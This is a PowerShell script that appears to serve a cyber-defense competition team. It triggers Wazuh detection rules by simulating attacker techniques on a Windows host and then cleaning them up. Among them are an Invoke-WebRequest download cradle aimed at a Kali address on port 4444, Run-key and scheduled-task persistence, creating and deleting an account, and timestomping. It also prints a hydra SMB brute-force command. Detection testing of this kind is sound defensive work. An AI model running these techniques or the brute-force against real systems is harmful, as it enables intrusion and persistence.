#Requires -RunAsAdministrator
param(
    [string]$KaliIp = ''
)

$ErrorActionPreference = 'Continue'
Import-Module (Join-Path $PSScriptRoot 'lib\Common.psm1') -Force

if (-not $KaliIp) {
    $KaliIp = Read-Host 'Enter Kali IP (optional, press Enter to skip network/brute-force prompt)'
}

$WinIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notmatch '^169\.254\.' } | Select-Object -First 1 -ExpandProperty IPAddress)

Write-Step '1. Host & AD Discovery (101028)'
cmd.exe /c 'whoami >nul & net user >nul'
Write-Ok 'Discovery commands executed.'

Write-Step '2. Archive Staging (101030)'
$lootSrc = Join-Path $env:TEMP 'ccdc_loot_src.txt'
$lootZip = Join-Path $env:TEMP 'ccdc_loot.zip'
Set-Content -Path $lootSrc -Value 'ccdc test'
powershell.exe -NoProfile -Command "Compress-Archive -Path '$lootSrc' -DestinationPath '$lootZip' -Force"
Remove-Item -Path $lootSrc, $lootZip -Force -ErrorAction SilentlyContinue
Write-Ok 'Archive staging test completed.'

Write-Step '3. User/Temp Path Execution (101017)'
$tempExe = Join-Path $env:LOCALAPPDATA 'Temp\ccdc_temp_exec.exe'
Copy-Item -Path 'C:\Windows\System32\where.exe' -Destination $tempExe -Force
& $tempExe cmd.exe | Out-Null
Remove-Item -Path $tempExe -Force -ErrorAction SilentlyContinue
Write-Ok 'Temp path execution completed.'

Write-Step '4. Sacrificial Process (101024)'
cmd.exe /c 'rundll32.exe'
Write-Ok 'Sacrificial process test completed.'

Write-Step '5. Suspicious PowerShell ScriptBlock & AMSI Pattern (101003, 101032)'
powershell.exe -NoProfile -Command { $null = 'DownloadString'; $null = 'IEX'; $null = 'AmsiUtils' }
Write-Ok 'PowerShell ScriptBlock tests completed.'

Write-Step '6. Download Cradle & Outbound Connection (101016, 101015)'
$targetUrl = if ($KaliIp) { "http://${KaliIp}:4444/ccdc_test" } else { 'http://127.0.0.1:9/ccdc_test' }
powershell.exe -NoProfile -Command "try { Invoke-WebRequest -Uri '$targetUrl' -TimeoutSec 2 -UseBasicParsing | Out-Null } catch {}"
Write-Ok 'Download cradle / outbound test completed.'

Write-Step '7. Registry Run Key Persistence (101019)'
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-ItemProperty -Path $runKey -Name 'ccdc_test_run' -Value 'C:\Windows\System32\cmd.exe /c exit' -PropertyType String -Force | Out-Null
Remove-ItemProperty -Path $runKey -Name 'ccdc_test_run' -Force -ErrorAction SilentlyContinue
Write-Ok 'Registry persistence test completed and cleaned up.'

Write-Step '8. Scheduled Task Persistence (101002)'
schtasks.exe /Create /TN 'CCDC_Test_Task' /TR 'cmd.exe /c exit' /SC ONCE /ST 23:59 /F | Out-Null
schtasks.exe /Delete /TN 'CCDC_Test_Task' /F | Out-Null
Write-Ok 'Scheduled task test completed and cleaned up.'

Write-Step '9. Account Creation & Deletion (101001)'
net.exe user ccdc_testred 'P@ssw0rd123!' /add | Out-Null
net.exe user ccdc_testred /delete | Out-Null
Write-Ok 'Account manipulation test completed and cleaned up.'

Write-Step '10. File Timestomping (101023)'
$tsFile = Join-Path $env:TEMP 'ccdc_ts_test.txt'
Set-Content -Path $tsFile -Value 'timestomp test'
(Get-Item $tsFile).CreationTime = Get-Date '2020-01-01 00:00:00'
Remove-Item -Path $tsFile -Force -ErrorAction SilentlyContinue
Write-Ok 'Timestomp test completed.'

if (Test-Path 'C:\inetpub\wwwroot') {
    Write-Step '11. IIS Webroot FIM (101012)'
    $webTest = 'C:\inetpub\wwwroot\ccdc_test.txt'
    Set-Content -Path $webTest -Value 'fim test'
    Start-Sleep -Seconds 2
    Remove-Item -Path $webTest -Force -ErrorAction SilentlyContinue
    Write-Ok 'Webroot FIM test completed.'
}

if ($KaliIp) {
    Write-Host "`n[KALI ACTION] Run SMB/RDP brute force from Kali against ${WinIp} (101004, 101005):" -ForegroundColor Yellow
    Write-Host "  hydra -l fakeuser -P /usr/share/wordlists/fasttrack.txt -t 4 -f smb://${WinIp}"
    Read-Host "Press Enter once done on Kali (or Enter to skip)" | Out-Null
}

Write-Ok 'All Windows detection tests finished. Check CCDC Live Triage Dashboard in Wazuh.'
